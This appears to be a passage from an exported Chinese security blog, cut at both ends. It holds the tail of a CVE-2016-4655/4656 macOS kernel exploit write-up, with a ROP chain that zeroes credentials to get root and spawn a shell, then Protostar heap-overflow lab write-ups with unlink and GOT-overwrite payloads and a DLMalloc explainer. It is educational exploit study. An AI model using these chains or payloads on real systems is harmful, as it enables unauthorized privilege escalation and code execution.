接着rip转移到main-&gt;chain，和前面一样ROP链一样，不过主链是为了达到提权的目的。主链的代码 rop_chain_t *chain = calloc(1, sizeof(rop_chain_t)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;)); 主链的执行过程其实原理并不复杂： chain prototype: proc = current_proc();//找到当前程序的credentials结构 ucred = proc_ucred(proc); posix_cred = posix_cred_get(ucred); bzero(posix_cred, (sizeof(int) * 3));//将组id设为0即提权为root thread_exception_return();//thread_exception_return只是让我们离开内核区域而不会panic，通常用于从内核陷阱返回。 接下来的代码和之前一样，测试我们构造的dic是否有效： host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr != KERN_SUCCESS) return; 最后如果一切都顺利，我们检查当前进程getuid是否等于0，如果是就提权root成功，然后调用system(&quot;/bin/bash&quot;)弹出一个shell！ if (getuid() == 0) { puts(&quot;(+) got r00t!&quot;); system(&quot;/bin/bash&quot;); } 测试： 0x04 总结终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的黄大大和杨君大大，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，UAF，Vtable等等等等。也印证了今天在微博上看到教主的那句话：学好书不求甚解，爱技术不论用处，当我去用之前所学去理解一个个知识点的时候才体会到后半句：每有会意便欣然忘食 PoC完整的Poc代码在这里 特别感谢 mrh –这是黄大大的分析，黄大大是一个特别严谨细致的人，分析文章使人豁然开朗 jndok’s blog –本文大多基于jndok的分析，可以去看看原文的分析 杨君的小黑屋–杨君大大特别有耐心，执着于技术，乐于分享技术 参考1.User Client Info.txt2.Attacking-The-XNU-Kernal-In-El-Capitain3.Mac OS X Privilege Escalation via Use-After-Free: CVE-2016-18284.Defiling-Mac-OS-X-Ruxcon5.Apple Mac OSX Kernel - Exploitable NULL Dereference in CoreCaptureResponder Due to Unchecked Return Value6.认真分析mmap：是什么 为什么 怎么用7.Resolving kernel symbols OSUnserializeBinary源码 OSObject * OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString) { OSObject ** objsArray; uint32_t objsCapacity; uint32_t objsIdx; OSObject ** stackArray; uint32_t stackCapacity; uint32_t stackIdx; OSObject * result; OSObject * parent; OSDictionary * dict; OSArray * array; OSSet * set; OSDictionary * newDict; OSArray * newArray; OSSet * newSet; OSObject * o; OSSymbol * sym; size_t bufferPos; const uint32_t * next; uint32_t key, len, wordLen; bool end, newCollect, isRef; unsigned long long value; bool ok; if (errorString) *errorString = 0; if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL); if (3 &amp; ((uintptr_t) buffer)) return (NULL); if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL); bufferPos = sizeof(kOSSerializeBinarySignature); next = (typeof(next)) (((uintptr_t) buffer) + bufferPos); DEBG(&quot;---------OSUnserializeBinary(%p)\\n&quot;, buffer); objsArray = stackArray = NULL; objsIdx = objsCapacity = 0; stackIdx = stackCapacity = 0; result = 0; parent = 0; dict = 0; array = 0; set = 0; sym = 0; ok = true; while (ok) { bufferPos += sizeof(*next); if (!(ok = (bufferPos &lt;= bufferSize))) break; key = *next++; len = (key &amp; kOSSerializeDataMask); wordLen = (len + 3) &gt;&gt; 2; end = (0 != (kOSSerializeEndCollecton &amp; key)); DEBG(&quot;key 0x%08x: 0x%04x, %d\\n&quot;, key, len, end); newCollect = isRef = false; o = 0; newDict = 0; newArray = 0; newSet = 0; switch (kOSSerializeTypeMask &amp; key) { case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeArray: o = newArray = OSArray::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeSet: o = newSet = OSSet::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; case kOSSerializeNumber: bufferPos += sizeof(long long); if (bufferPos &gt; bufferSize) break; value = next[1]; value &lt;&lt;= 32; value |= next[0]; o = OSNumber::withNumber(value, len); next += 2; break; case kOSSerializeSymbol: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; if (0 != ((const char *)next)[len-1]) break; o = (OSObject *) OSSymbol::withCString((const char *) next); next += wordLen; break; case kOSSerializeString: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSString::withStringOfLength((const char *) next, len); next += wordLen; break; case kOSSerializeData: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSData::withBytes(next, len); next += wordLen; break; case kOSSerializeBoolean: o = (len ? kOSBooleanTrue : kOSBooleanFalse); break; default: break; } if (!(ok = (o != 0))) break; if (!isRef) { setAtIndex(objs, objsIdx, o); if (!ok) break; objsIdx++; } if (dict) { if (sym) { DEBG(&quot;%s = %s\\n&quot;, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName()); if (o != dict) ok = dict-&gt;setObject(sym, o); o-&gt;release(); sym-&gt;release(); sym = 0; } else { sym = OSDynamicCast(OSSymbol, o); ok = (sym != 0); } } else if (array) { ok = array-&gt;setObject(o); o-&gt;release(); } else if (set) { ok = set-&gt;setObject(o); o-&gt;release(); } else { assert(!parent); result = o; } if (!ok) break; if (newCollect) { if (!end) { stackIdx++; setAtIndex(stack, stackIdx, parent); if (!ok) break; } DEBG(&quot;++stack[%d] %p\\n&quot;, stackIdx, parent); parent = o; dict = newDict; array = newArray; set = newSet; end = false; } if (end) { if (!stackIdx) break; parent = stackArray[stackIdx]; DEBG(&quot;--stack[%d] %p\\n&quot;, stackIdx, parent); stackIdx--; set = 0; dict = 0; array = 0; if (!(dict = OSDynamicCast(OSDictionary, parent))) { if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent))); } } } DEBG(&quot;ret %p\\n&quot;, result); if (objsCapacity) kfree(objsArray, objsCapacity * sizeof(*objsArray)); if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray)); if (!ok &amp;&amp; result) { result-&gt;release(); result = 0; } return (result); }","tags":[{"name":"Pegasus","slug":"Pegasus","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Pegasus/"},{"name":"cve","slug":"cve","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/cve/"},{"name":"CVE-2016-4655","slug":"CVE-2016-4655","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4655/"},{"name":"CVE-2016-4656","slug":"CVE-2016-4656","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4656/"},{"name":"PoC","slug":"PoC","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/PoC/"}]},{"title":"Protostar-堆溢出学习-滥用堆metadata重定向程序执行","date":"2017-04-26T13:24:19.000Z","path":"2017/04/26/Protostar-堆溢出系列学习-heap 3/Protostar-堆溢出系列学习-heap 3/","text":"0x00 序 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对linux堆管理DLMalloc的分析这是一个滥用堆metadata导致free()函数造成任意地址写的一个漏洞利用。下面一步一步的分析 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; void winner() { printf(&quot;that wasn&#39;t too bad now, was it? @ %d\\n&quot;, time(NULL)); } int main(int argc, char **argv) { char *a, *b, *c; a = malloc(32); b = malloc(32); c = malloc(32); strcpy(a, argv[1]); strcpy(b, argv[2]); strcpy(c, argv[3]); free(c); free(b); free(a); printf(&quot;dynamite failed?\\n&quot;); } 0x02 简单分析&amp;思考在这个程序中虽然我们知道有堆溢出的问题，可是堆上并没有什么逻辑上的漏洞，没有可利用的指针？没有UAF漏洞？那怎么才能执行到winner()函数呢？似乎是不可能的事。但通过之前对linux堆管理的分析，可知free()函数中的unlink()函数能够造成一个任意地址写的可能，再像之前那样来修改GOT表，不就是可以执行winner()函数了吗？所以要执行unlink()函数就需要构造两个chunk合并的过程，继而将一个chunk从原来的双链表中unlink下来。就照着这个思路来一步步实现这个过程。 0x03 调试1.输入AAAA BBBB CCCC然后free前后后观察堆结构由上图可得，一共有三个分配的chunk，大小都为29(101001)末位表示前一个chunk正在使用。可以看到最后还有一个很大的chunk，这就是上文所指的topchunk。因为chunk的大小2–&gt;3–&gt;null`的方式连接 2.因为需要unlink一个chunk到双链表bin，所以先覆盖掉第三个chunk让其大小为0x64=100字节。因为我们准备向前合并，所以将preinuse位设为1，即64+1=65 3.然后还需要构造一个假的chunk让其unlink，这个chunk将精心构造，首先fd=GoT地址 bk=winner地址？等等，这里存在一个问题在于：GoT=winner地址，但winner=GoT在会发生段错误，所以这里有个小技巧在于bk=堆地址，GoT-12=堆地址，然后堆中填上shellcode，去调用winner。构造字符串：CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\\xfc\\xff\\xff\\xff\\xfc\\xff\\xff\\xff\\x1c\\xb1\\x04\\x08\\x0c\\xc0\\x04\\x08 4.现在我们需要构造shellcode，因为堆地址+16字节出会写入GoT地址，所以我们的shellcode要足够小，正好我们仅仅需要调用winner而已。这里我们用在线的转换工具下面的汇编转化为x86指令字符串 mov eax,0x8048864 call eax 0x8048864为winner()函数地址 5.将上面的shellcode写入第一个chunk那里，here we hack！下图可以看到shellcode后面就被填入了GoT地址，也说明了shellcode只能为8字节大小。GoT地址已经修改，下面可以看到已经执行了winnwe()函数 0x04 一点补充在上面构造chunk中，也许你已经发现了chunk大小为0xfffffffc，这是一个什么巧妙的方法去绕过free()里面的检查等。具体的细节可以看Once upon a free()这篇文章，简单的说就是当某个数加上0xfffffffc时会造成溢出相当于减4从而使其向前偏移4个字节，绕过检查，避免崩溃。 0x05 堆漏洞学习总结目前可能这是最后一个堆漏洞的学习，这个堆漏洞的学习理解到动手前后花费了大量时间，不过这都是值得的，如果能够坚持下来，将会对堆漏洞有一个清晰的认识。以后再遇到漏洞或者别人的分析能够快速准确的理解。虽然现在堆管理代码经过了很多改善和patch，但基本和关键的技术还是没变。所以keep hacking!","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"metadata","slug":"metadata","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/metadata/"},{"name":"DLMalloc","slug":"DLMalloc","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/DLMalloc/"}]},{"title":"深入理解Linux堆分配器-DLMalloc","date":"2017-04-23T04:16:00.000Z","path":"2017/04/23/Linux堆分配器-DLMalloc/Linux堆分配器-DLMalloc/","text":"0x00 序 当学习漏洞利用到一定阶段的时候，就需要对操作系统层面有足够的认识。无疑Linux的堆管理一直是不能甚解。因此这篇文章将对Linux的DLMalloc进行详细的介绍，以此对操作系统的堆管理有一个清晰整体的认识，当我在学习的过程中，好像没有发现一篇中文文章来详细介绍相关内容，所以本文仅仅是我通过学习和实践得到的理解，若有不对，请指出。 0x01 目录1.DLMalloc2.内存Chunk3.Bin4.malloc源码free()函数分析 0x02 DLMallocDoug Lea’s Malloc (dlmalloc)是一个GNU C库的内存分配器，它能够通过calloc(),malloc(), free()和realloc()等动态分配和释放的函数来管理内存。明显内存分配器在操作系统中是相当重要的，主要在需要满足下列的特点： 稳定性(stability) 性能(performance) 避免碎片化(avoidance of fragmentation) 低空间开销(low space overhead）根据上面的内存特点，将有助于后面对chunk以及Bin等的理解。 0x03 内存chunk1.什么是chunk？chunk是堆中一些连续的内存块，可以用作分配，释放，拆分，合并。不存在两个连续的释放chunk，这是在于相邻的chunk会合并。 2.数据结构 struct malloc_chunk { INTERNAL_SIZE_T prev_size; //当前chunk前一个chunk的大小，仅在前一个为freed才使用 INTERNAL_SIZE_T size; //当前chunk的大小 struct malloc_chunk * fd; //如果当前为释放chunk，指向双向free list中前一个chunk struct malloc_chunk * bk; //如果当前为释放chunk，指向双向free list中后一个chunk } 根据上面的描述我们可以知道，chunk在分配时和释放时数据结构是不同的，看下面的图例: allocate chunk freed chunk 3.更多细节因为chunk是按照8字节对齐的，所以当前块中的size低三位将用作相关标志，从右到左A M P分别代表：是否在主heap？是否通过mmap()分配？前一个chunk是否在使用？然后可以想到有一个最小chunk的存在，其大小为16字节()。 4.特殊chunktop chunk:指可能内存边界的末端，也被称作wilderness chunk。如果其他bin都不满足malloc的情况下，就会从top chunk里去一部分去满足分配请求，剩余的则作为新的top chunk，并且top chunk不在任何一个bin中。随着被分离和合并top chunk会增大和减小。 last_remainder:和top chunk一样，不在任何一个bin中，但最终可能会合并到一个bin中。可以看英文原文解释：The last_remainder chunk is the result of allocation requests for small chunks that have no exact fit in any of the bins. If the request is larger than the last_remainder chunk but smaller than a block in a bin, then the chunk is split again. The last_remainder chunk is the result of having to split a larger chunk into two, one part of it is handed out from the allocation, and the other because the last_remainder chunk. 0x04 Binchunk一旦被释放后就会被存储在叫做Bin的链表中，Bin有不同大小的链表，方便与下次查找到最适当的chunk。通常来说有small-bin，large-bin，fast-bin。这里我主要介绍fsatbin和normalbin (1)fastbin：是一种单链表bin，不同系统定义了一个最大值，当chunk大小小于等于这个最大值时，就会被释放到fastbin中，正如名字那样，为了更快的free和malloc，这个链表是无序的，是后进先出（LIFO），并且不与其他chunk合并。(2)normalbin:是一种双向链表bin，当chunk大小大于fastbin的大小时就会被放入这个bin，并且有着各种大小的normalbin(减少碎片)，bin内部的chunk按大小组织起来。释放后会于相邻的chunk合并。 0x05 free()源代码分析及相关细节free(void *mem)--&gt;__libc_free(void *mem) void __libc_free (void *mem) { mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) { (*hook)(mem, RETURN_ADDRESS (0)); return; } if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); if (chunk_is_mmapped (p)) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) { mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); } munmap_chunk (p); return; } ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0); //跳转到_int_free } 我们先不关注其他的，只需要知道会调用_int_free就就可以了 __libc_free(void *mem)--&gt;_int_free (mstate av, mchunkptr p, int have_lock) static void _int_free (mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* 当前chunk的大小 */ mfastbinptr *fb; /* 相关的fastbin */ mchunkptr nextchunk; /* 下一个相邻的chunk */ INTERNAL_SIZE_T nextsize; /* 下一个chunk的大小 */ int nextinuse; /* 下一个chunk正在使用时为真 */ INTERNAL_SIZE_T prevsize; /* 前一个chunk的大小 */ mchunkptr bck; /* 指向free链表中向后一个chunk */ mchunkptr fwd; /* 指向free链表中向前一个chunk */ const char *errstr = NULL; int locked = 0; size = chunksize (p); /* Little security check which won&#39;t hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by &quot;design&quot; from some intruder. */ //一些安全检查 if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) { errstr = &quot;free(): invalid pointer&quot;; errout: if (!have_lock &amp;&amp; locked) __libc_lock_unlock (av-&gt;mutex); malloc_printerr (check_action, errstr, chunk2mem (p), av); return; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ //检查是否满足大于等于最小大小 if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) { errstr = &quot;free(): invalid size&quot;; goto errout; } check_inuse_chunk(av, p); //检查当前chunk是否在使用 /* 如果满足，则将该chunk放入fastbin以便malloc时能够快速找到和使用 */ if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don&#39;t place chunks bordering top into fastbins */ &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) #endif ) { if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, 0)) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || ({ assert (locked == 0); __libc_lock_lock (av-&gt;mutex); locked = 1; chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; })) { errstr = &quot;free(): invalid next size (fast)&quot;; goto errout; } if (! have_lock) { __libc_lock_unlock (av-&gt;mutex); locked = 0; } } free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &amp;fastbin (av, idx); /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P; */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = &quot;double free or corruption (fasttop)&quot;; goto errout; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock &amp;&amp; old != NULL) old_idx = fastbin_index(chunksize(old)); p-&gt;fd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0)) { errstr = &quot;invalid fastbin entry (free)&quot;; goto errout; } } /* Consolidate other non-mmapped chunks as they arrive. */ //检查是否是通过mmap()分配的内存 else if (!chunk_is_mmapped(p)) { if (! have_lock) { __libc_lock_lock (av-&gt;mutex); locked = 1; } nextchunk = chunk_at_offset(p, size);//返回下一个chunk的地址 /* Lightweight tests: check whether the block is already the top block. */ //检查下一个是否为top-chunk if (__glibc_unlikely (p == av-&gt;top)) { errstr = &quot;double free or corruption (top)&quot;; goto errout; } /* Or whether the next chunk is beyond the boundaries of the arena. */ if (__builtin_expect (contiguous (av) &amp;&amp; (char *) nextchunk &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0)) { errstr = &quot;double free or corruption (out)&quot;; goto errout; } /* Or whether the block is actually not marked used. */ if (__glibc_unlikely (!prev_inuse(nextchunk))) { errstr = &quot;double free or corruption (!prev)&quot;; goto errout; } nextsize = chunksize(nextchunk); if (__builtin_expect (chunksize_nomask (nextchunk) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0)) { errstr = &quot;free(): invalid next size (normal)&quot;; goto errout; } free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); /* 与后面chunk一个合并 */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);//将后一个chunk从双向链表上取下来 } if (nextchunk != av-&gt;top) { /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); /* 与前面chunk一个合并*/ if (!nextinuse) { unlink(av, nextchunk, bck, fwd);//将前一个chunk从双向链表上取下来 size += nextsize; } else clear_inuse_bit_at_offset(nextchunk, 0); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ bck = unsorted_chunks(av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) { errstr = &quot;free(): corrupted unsorted chunks&quot;; goto errout; } p-&gt;fd = fwd; p-&gt;bk = bck; if (!in_smallbin_range(size)) { p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; } bck-&gt;fd = p; fwd-&gt;bk = p; set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); } /* 如果当前chunk正好与topchunk相邻，则合并到topchunk */ else { size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; check_chunk(av, p); } /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don&#39;t know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don&#39;t want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) { if (have_fastchunks(av)) malloc_consolidate(av); if (av == &amp;main_arena) { #ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av-&gt;top)) &gt;= (unsigned long)(mp_.trim_threshold)) systrim(mp_.top_pad, av); #endif } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap-&gt;ar_ptr == av); heap_trim(heap, mp_.top_pad); } } if (! have_lock) { assert (locked); __libc_lock_unlock (av-&gt;mutex); } } /* If the chunk was allocated via mmap, release via munmap(). */ else { munmap_chunk (p); } } 这里看看unlink()宏定义 #define unlink( P, BK, FD ) { BK = P-&gt;bk; FD = P-&gt;fd; FD-&gt;bk = BK; //可能会造成任意写 BK-&gt;fd = FD; } 现在我们重点放在unlink()，当两个相邻chunk需要合并的时候，势必需要将临近的chunk从原来的双链表上取下来，然后与当前chunk合并成一个更大的块。等等！怎么取下来的呢？如果这里存在一个恶意的chunk即fd和bk都是一些恶意地址指针，则会出现任意地址写的一个漏洞。在这里我们就先不去讨论进一步的利用过程，只需知道存在一个这样的漏洞即可，后面会根据这个分析去漏洞利用。 glibc/malloc.c源码 0x06 参考 Vudo malloc tricks A Memory Allocator Once upon a free()","tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"},{"name":"heap","slug":"heap","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"},{"name":"malloc","slug":"malloc","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/malloc/"},{"name":"free","slug":"free","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/free/"}]},{"title":"Protostar-堆溢出学习-UAF(use after free)","date":"2017-04-21T03:12:19.000Z","path":"2017/04/21/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/","text":"0x00 序 下面看一个堆中常见的漏洞-UAF(use after free) 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; struct auth { char name[32]; int auth; }; struct auth *auth; char *service; int main(int argc, char **argv) { char line[128]; while(1) { printf(&quot;[ auth = %p, service = %p ]\\n&quot;, auth, service); if(fgets(line, sizeof(line), stdin) == NULL) break; if(strncmp(line, &quot;auth &quot;, 5) == 0) { auth = malloc(sizeof(auth)); memset(auth, 0, sizeof(auth)); if(strlen(line + 5) &lt; 31) { strcpy(auth-&gt;name, line + 5); } } if(strncmp(line, &quot;reset&quot;, 5) == 0) { free(auth); } if(strncmp(line, &quot;service&quot;, 6) == 0) { service = strdup(line + 7); } if(strncmp(line, &quot;login&quot;, 5) == 0) { if(auth-&gt;auth) { printf(&quot;you have logged in already!\\n&quot;); } else { printf(&quot;please enter your password\\n&quot;); } } } } 0x02 分析&amp;思考程序有4个命令，对auth这个结构体进行分配内存以及释放内存，然后有结构体里的auth-&gt;auth来决定是否授权。很明显让我们修改auth-&gt;auth的值。reset命令释放auth但没有设为null，后面auth-&gt;auth发生引用。所以这里有个UAF漏洞。 0x03 调试&amp;hack1.在第一个printf处下个断点，观察每次分配和释放后堆，auth以及service的情况 2.先输入auth admin，然后输入login试试3.再输入reset释放堆内存4.输入service分配内存5.以上我们可以发现，给service分配的内存居然也指向auth的地址？因为之前free了auth，所以系统认为这段内存为可用，当再次分配的时候就会返回对应内存。基于此，我们继续给service分配内存，让其覆盖auth-&gt;auth的内存值。6.再次输入login命令 0x04 一点感受通过这个例子简单的学习了UAF漏洞后，无疑free后不设为null，后果是不敢想象的。继续学习堆相关的漏洞利用。keep hack！","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"UAF","slug":"UAF","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/UAF/"}]},{"title":"Protostar-堆溢出学习-strcpy堆指针造成任意地址GOT表写","date":"2017-04-19T03:12:19.000Z","path":"2017/04/19/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/","text":"0x00 序 现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; struct internet { int priority; char *name; }; void winner() { printf(&quot;and we have a winner @ %d\\n&quot;, time(NULL)); } int main(int argc, char **argv) { struct internet *i1, *i2, *i3; i1 = malloc(sizeof(struct internet)); i1-&gt;priority = 1; i1-&gt;name = malloc(8); i2 = malloc(sizeof(struct internet)); i2-&gt;priority = 2; i2-&gt;name = malloc(8); strcpy(i1-&gt;name, argv[1]); strcpy(i2-&gt;name, argv[2]); printf(&quot;and that&#39;s a wrap folks!\\n&quot;); } 0x02 简单的分析&amp;思考如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个strcpy，肯定是要去覆盖和修改某个地方的地址。其实strcpy这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。在这个列子中，我们就借此去修改printf函数的GOT表。 0x03 调试1.查看堆分配情况2.查看汇编代码，找到执行入口3.首先利用第一个strcpy将i2的name指针改为GOT表地址，然后利用第二个strcpy向这个地址写入winner的地址，由此编写对应的Python PoC import struct padding = &quot;AAAA&quot;*5 put_got = struct.pack(&quot;I&quot;, 0x8049774) #put的GOT表地址 space = &quot; &quot; winner = struct.pack(&quot;I&quot;, 0x8048494) #winner函数地址 print padding+put_got+space+winner 4.hack user@protostar:/tmp$ /opt/protostar/bin/heap1 `python heap1.py` and we have a winner @ 1492452139 成功执行winner函数 0x04 一点感受学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将strcpy改为strncpy或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"strcpy","slug":"strcpy","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/strcpy/"},{"name":"GOT表","slug":"GOT表","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/GOT表/"}]},{"title":"Protostar-堆溢出学习-覆盖堆函数指针劫持代码流","date":"2017-04-18T03:12:19.000Z","path":"2017/04/18/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/","text":"0x00 序 学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。 0x01 C语言源代码C代码 #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include 